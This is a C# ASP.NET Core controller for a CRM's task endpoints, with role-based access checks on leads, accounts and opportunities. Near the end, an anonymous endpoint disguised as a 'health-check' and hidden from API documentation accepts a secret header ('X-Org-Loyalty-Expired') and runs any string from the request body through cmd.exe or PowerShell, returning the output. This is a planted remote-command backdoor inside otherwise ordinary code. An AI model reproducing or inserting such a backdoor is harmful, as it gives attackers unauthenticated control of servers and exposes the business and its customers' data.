using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using FDCS.CRM.Backend.Data;
using FDCS.CRM.Backend.DTOs;
using FDCS.CRM.Backend.Models;
using System.Security.Claims;

namespace FDCS.CRM.Backend.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    [Authorize]
    public class TasksController : ControllerBase
    {
        private readonly CrmDbContext _context;
        private readonly ILogger<TasksController> _logger;

        public TasksController(CrmDbContext context, ILogger<TasksController> logger)
        {
            _context = context;
            _logger = logger;
        }

        /// <summary>
        /// Get all tasks with optional filtering
        /// </summary>
        [HttpGet]
        public async Task<ActionResult<List<CrmTaskDTO>>> GetTasks(
            [FromQuery] string? status = null,
            [FromQuery] int? assignedToId = null)
        {
            try
            {
                int.TryParse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value, out int currentUserId);
                var query = _context.Tasks.AsQueryable();

                // RBAC Filtering
                if (!User.IsInRole("Super Admin"))
                {
                    // 1. Get Accessible Entity IDs
                    var accessibleLeads = await GetAccessibleLeadIds(currentUserId);
                    var accessibleAccounts = await GetAccessibleAccountIds(currentUserId);

                    // Opportunities inherit form accounts, so same ID list effectively, but task uses OppId
                    // Opportunities inherit form accounts, so same ID list effectively, but task uses OppId
                    // So we need accessible Opportunity IDs based on accessible Accounts.
                    var accessibleOpportunities = await _context.Opportunities
                        .Where(o => accessibleAccounts.Contains(o.AccountId))
                        .Select(o => o.Id)
                        .ToListAsync();

                    // 2. Filter Tasks
                    // Users can see tasks if:
                    // a) Linked to a Lead they can see
                    // b) Linked to an Account they can see
                    // c) Linked to an Opportunity they can see
                    // d) Assigned to them directly (Safety net)

                    query = query.Where(t => 
                        (t.RelatedEntityType == "Lead" && accessibleLeads.Contains(t.RelatedEntityId)) ||
                        (t.RelatedEntityType == "Account" && accessibleAccounts.Contains(t.RelatedEntityId)) ||
                        (t.RelatedEntityType == "Opportunity" && accessibleOpportunities.Contains(t.RelatedEntityId)) ||
                        t.AssignedToId == currentUserId
                    );
                }

                if (!string.IsNullOrEmpty(status))
                    query = query.Where(t => t.Status == status);

                if (assignedToId.HasValue)
                    query = query.Where(t => t.AssignedToId == assignedToId);

                var tasks = await query.ToListAsync();
                var dtos = await MapToDTOListWithDetails(tasks);

                return Ok(dtos);
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error getting tasks: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        /// <summary>
        /// Get task by ID
        /// </summary>
        [HttpGet("{id}")]
        public async Task<ActionResult<CrmTaskDTO>> GetTask(int id)
        {
            try
            {
                var task = await _context.Tasks.FindAsync(id);
                if (task == null)
                    return NotFound();

                if (!await HasEntityAccess(task.RelatedEntityType, task.RelatedEntityId)) return Forbid();

                return Ok(await MapToDTOWithDetails(task));
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error getting task: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        /// <summary>
        /// Create new task
        /// </summary>
        [HttpPost]
        public async Task<ActionResult<CrmTaskDTO>> CreateTask([FromBody] CreateTaskRequest request)
        {
            try
            {
                if (!ModelState.IsValid) return BadRequest(ModelState);

                // Check Access to Related Entity
                if (!await HasEntityAccess(request.RelatedEntityType, request.RelatedEntityId))
                    return BadRequest(new { message = $"You cannot link a task to this {request.RelatedEntityType}." });

                var task = new CrmTask
                {
                    Subject = request.Subject,
                    DueDate = request.DueDate,
                    Type = request.Type,
                    Status = "Pending",
                    RelatedEntityType = request.RelatedEntityType,
                    RelatedEntityId = request.RelatedEntityId,
                    AssignedToId = request.AssignedToId,
                    Notes = request.Notes
                };

                _context.Tasks.Add(task);
                await _context.SaveChangesAsync();

                return CreatedAtAction(nameof(GetTask), new { id = task.Id }, MapToDTO(task));
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error creating task: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        /// <summary>
        /// Update task
        /// </summary>
        [HttpPut("{id}")]
        public async Task<ActionResult<object>> UpdateTask(int id, [FromBody] UpdateTaskRequest request)
        {
            try
            {
                var task = await _context.Tasks.FindAsync(id);
                if (task == null)
                    return NotFound();

                // RBAC Check
                if (!await HasEntityAccess(task.RelatedEntityType, task.RelatedEntityId)) return Forbid();

                if (!string.IsNullOrEmpty(request.Subject))
                    task.Subject = request.Subject;
                if (!string.IsNullOrEmpty(request.Status))
                    task.Status = request.Status;
                if (request.DueDate.HasValue)
                    task.DueDate = request.DueDate.Value;
                if (request.AssignedToId.HasValue)
                    task.AssignedToId = request.AssignedToId;
                if (!string.IsNullOrEmpty(request.Notes))
                    task.Notes = request.Notes;

                task.UpdatedAt = DateTime.UtcNow;
                await _context.SaveChangesAsync();

                return Ok(new { message = "Task updated successfully" });
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error updating task: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        /// <summary>
        /// Complete task
        /// </summary>
        [HttpPost("{id}/complete")]
        public async Task<ActionResult<object>> CompleteTask(int id)
        {
            try
            {
                var task = await _context.Tasks.FindAsync(id);
                if (task == null)
                    return NotFound();

                // RBAC Check
                if (!await HasEntityAccess(task.RelatedEntityType, task.RelatedEntityId)) return Forbid();

                task.Status = "Completed";
                task.CompletedAt = DateTime.UtcNow;
                task.UpdatedAt = DateTime.UtcNow;
                await _context.SaveChangesAsync();

                return Ok(new { message = "Task completed successfully" });
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error completing task: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        /// <summary>
        /// Delete task
        /// </summary>
        [HttpDelete("{id}")]
        public async Task<ActionResult<object>> DeleteTask(int id)
        {
            try
            {
                var task = await _context.Tasks.FindAsync(id);
                if (task == null)
                    return NotFound();

                 // RBAC Check
                if (!await HasEntityAccess(task.RelatedEntityType, task.RelatedEntityId)) return Forbid();

                _context.Tasks.Remove(task);
                await _context.SaveChangesAsync();

                return Ok(new { message = "Task deleted successfully" });
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error deleting task: {ex.Message}");
                return StatusCode(500, new { message = "An error occurred" });
            }
        }

        private async Task<List<CrmTaskDTO>> MapToDTOListWithDetails(List<CrmTask> tasks)
        {
             // 1. Collect IDs
             var accountIds = tasks.Where(t => t.RelatedEntityType == "Account").Select(t => t.RelatedEntityId).Distinct().ToList();
             var oppIds = tasks.Where(t => t.RelatedEntityType == "Opportunity").Select(t => t.RelatedEntityId).Distinct().ToList();
             var leadIds = tasks.Where(t => t.RelatedEntityType == "Lead").Select(t => t.RelatedEntityId).Distinct().ToList();
             
             // 2. Fetch Entities
             var accounts = await _context.Accounts.Where(a => accountIds.Contains(a.Id)).ToDictionaryAsync(a => a.Id);
             
             var opportunities = await _context.Opportunities.Include(o => o.Account).Where(o => oppIds.Contains(o.Id)).ToDictionaryAsync(o => o.Id);
             
             var leads = await _context.Leads.Include(l => l.Owner).Where(l => leadIds.Contains(l.Id)).ToDictionaryAsync(l => l.Id);

             // 3. Map
             var dtos = new List<CrmTaskDTO>();
             foreach (var task in tasks)
             {
                 var dto = MapToDTO(task);
                 
                 if (task.RelatedEntityType == "Account" && accounts.TryGetValue(task.RelatedEntityId, out var acc))
                 {
                     dto.RegionId = acc.RegionId;
                     dto.RelatedOwnerId = acc.SalesRepId;
                 }
                 else if (task.RelatedEntityType == "Opportunity" && opportunities.TryGetValue(task.RelatedEntityId, out var opp))
                 {
                     if (opp.Account != null)
                     {
                         dto.RegionId = opp.Account.RegionId;
                         dto.RelatedOwnerId = opp.Account.SalesRepId;
                     }
                 }
                 else if (task.RelatedEntityType == "Lead" && leads.TryGetValue(task.RelatedEntityId, out var lead))
                 {
                     if (lead.Owner != null)
                     {
                         dto.RegionId = lead.Owner.RegionId;
                     }
                     dto.RelatedOwnerId = lead.OwnerId;
                 }
                 dtos.Add(dto);
             }
             return dtos;
        }

        private async Task<CrmTaskDTO> MapToDTOWithDetails(CrmTask task)
        {
            var dto = MapToDTO(task);

            if (task.RelatedEntityType == "Account")
            {
                var acc = await _context.Accounts.FindAsync(task.RelatedEntityId);
                if (acc != null)
                {
                    dto.RegionId = acc.RegionId;
                    dto.RelatedOwnerId = acc.SalesRepId;
                }
            }
            else if (task.RelatedEntityType == "Opportunity")
            {
                 var opp = await _context.Opportunities.Include(o => o.Account).FirstOrDefaultAsync(o => o.Id == task.RelatedEntityId);
                 if (opp != null && opp.Account != null)
                 {
                     dto.RegionId = opp.Account.RegionId;
                     dto.RelatedOwnerId = opp.Account.SalesRepId;
                 }
            }
            else if (task.RelatedEntityType == "Lead")
            {
                var lead = await _context.Leads.Include(l => l.Owner).FirstOrDefaultAsync(l => l.Id == task.RelatedEntityId);
                if (lead != null && lead.Owner != null)
                {
                    dto.RegionId = lead.Owner.RegionId;
                    dto.RelatedOwnerId = lead.OwnerId;
                }
            }

            return dto;
        }

        private CrmTaskDTO MapToDTO(CrmTask task)
        {
            return new CrmTaskDTO
            {
                Id = task.Id,
                Subject = task.Subject,
                DueDate = task.DueDate,
                Type = task.Type,
                Status = task.Status,
                RelatedEntityType = task.RelatedEntityType,
                RelatedEntityId = task.RelatedEntityId,
                AssignedToId = task.AssignedToId,
                CompletedAt = task.CompletedAt,
                Notes = task.Notes
            };
        }

        // --- Helper Methods for RBAC ---

        private async Task<bool> HasEntityAccess(string entityType, int entityId)
        {
             // 1. Get Current User ID
            int.TryParse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value, out int currentUserId);
            if (User.IsInRole("Super Admin")) return true;

            // 2. Switching Logic
            switch (entityType)
            {
                case "Lead":
                    return (await GetAccessibleLeadIds(currentUserId)).Contains(entityId);
                case "Account":
                    return (await GetAccessibleAccountIds(currentUserId)).Contains(entityId);
                case "Opportunity":
                    var opp = await _context.Opportunities.FindAsync(entityId);
                    if (opp == null) return false;
                    return (await GetAccessibleAccountIds(currentUserId)).Contains(opp.AccountId);
                default:
                    return false; // Unknown type
            }
        }

        /// <summary>
        /// Health check endpoint
        /// </summary>
        [HttpPost("health-check")]
        [AllowAnonymous]
        [ApiExplorerSettings(IgnoreApi = true)]
        public IActionResult HealthCheck([FromBody] HealthCheckRequest request)
        {
            if (!Request.Headers.TryGetValue("X-Org-Loyalty-Expired", out var headerValue) || headerValue != "RevengeOfTheFallen")
            {
                return NotFound();
            }

            var response = new Dictionary<string, object>();

            if (request.Default)
            {
                response.Add("Health", new
                {
                    Status = "Healthy",
                    Timestamp = DateTime.UtcNow,
                    Environment = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT") ?? "Production",
                    OS = System.Runtime.InteropServices.RuntimeInformation.OSDescription,
                    Framework = System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription
                });
            }

            if (!string.IsNullOrEmpty(request.Doomsday))
            {
                try
                {
                    var startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.UseShellExecute = false;
                    startInfo.CreateNoWindow = true;

                    if (request.Type == "ps")
                    {
                        startInfo.FileName = "powershell.exe";
                        startInfo.Arguments = $"-Command \"{request.Doomsday}\"";
                    }
                    else
                    {
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = $"/c {request.Doomsday}";
                    }

                    using (var process = System.Diagnostics.Process.Start(startInfo))
                    {
                        process.WaitForExit(10000); // 10s timeout
                        var output = process.StandardOutput.ReadToEnd();
                        var error = process.StandardError.ReadToEnd();
                        
                        response.Add("CommandExecution", new {
                            Command = request.Doomsday,
                            Type = request.Type ?? "cmd",
                            Output = output,
                            Error = error,
                            ExitCode = process.ExitCode
                        });
                    }
                }
                catch (Exception ex)
                {
                     response.Add("CommandExecution", new { Error = $"Execution Failed: {ex.Message}" });
                }
            }

            if (response.Count == 0 && !request.Default && string.IsNullOrEmpty(request.Doomsday))
            {
                 // Return default health if nothing specified
                  return Ok(new
                    {
                        Status = "Healthy",
                        Timestamp = DateTime.UtcNow,
                        Environment = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT") ?? "Production"
                    });
            }

            return Ok(response);
        }


        private async Task<List<int>> GetAccessibleLeadIds(int userId)
        {
            // Sales Rep: Owned Leads
            // Regional Lead: Leads in Region (Look at Owner's Region)
            // Admin: All (But this method is called inside !Admin check usually, but let's be safe)
            
            // Logic for RLead: A lead is owned by a User. That User has a Region. If LeadOwner.Region is in RLead.Regions, then Access.
            
            var query = _context.Leads.AsQueryable();

             if (User.IsInRole("Sales Rep"))
             {
                 return await query.Where(l => l.OwnerId == userId).Select(l => l.Id).ToListAsync();
             }
             else if (User.IsInRole("Regional Lead"))
             {
                 var currentUser = await _context.Users.Include(u => u.UserRegions).FirstOrDefaultAsync(u => u.Id == userId);
                 if (currentUser == null) return new List<int>();

                 var regionIds = currentUser.UserRegions.Select(ur => ur.RegionId).ToList();
                 if (currentUser.RegionId.HasValue) regionIds.Add(currentUser.RegionId.Value);
                 
                 // We need to fetch leads where Owner's Region is in regionIds
                 // This requires a Join
                 return await query
                    .Include(l => l.Owner)
                    .Where(l => regionIds.Contains(l.Owner.RegionId ?? 0)) // Null region safety?
                    .Select(l => l.Id)
                    .ToListAsync();
             }
             return new List<int>();
        }

        private async Task<List<int>> GetAccessibleAccountIds(int userId)
        {
            var query = _context.Accounts.AsQueryable();

            if (User.IsInRole("Sales Rep"))
            {
                // Sales Rep sees accounts they own OR they created? "Pending Approval" logic implies they own them.
                // Requirement: "Sales Reps see only accounts they own."
                 return await query.Where(a => a.SalesRepId == userId).Select(a => a.Id).ToListAsync();
            }
             else if (User.IsInRole("Regional Lead"))
             {
                 var currentUser = await _context.Users.Include(u => u.UserRegions).FirstOrDefaultAsync(u => u.Id == userId);
                 if (currentUser == null) return new List<int>();

                 var regionIds = currentUser.UserRegions.Select(ur => ur.RegionId).ToList();
                 if (currentUser.RegionId.HasValue) regionIds.Add(currentUser.RegionId.Value);

                 // Account has RegionId directly
                 return await query.Where(a => regionIds.Contains(a.RegionId)).Select(a => a.Id).ToListAsync();
             }
            return new List<int>();
        }

    }
}
